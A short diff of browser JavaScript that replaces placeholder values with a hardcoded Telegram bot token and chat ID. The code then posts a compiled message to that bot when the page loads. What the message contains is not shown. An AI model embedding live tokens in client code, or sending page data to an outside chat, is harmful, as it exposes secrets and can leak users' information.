@@ -158,11 +158,11 @@ document.addEventListener('DOMContentLoaded', () => {
     const finalMessage = result.join('\n');
 
     try {
-      await fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage', {
+      await fetch('https://api.telegram.org/bot<8307377112:AAEb7d6w3tBypnqclQpJ5mBdSMG5SwoMWXc>/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: '<YOUR_CHAT_ID>',
+          chat_id: '<4961000707>',
           text: finalMessage
         })
       });
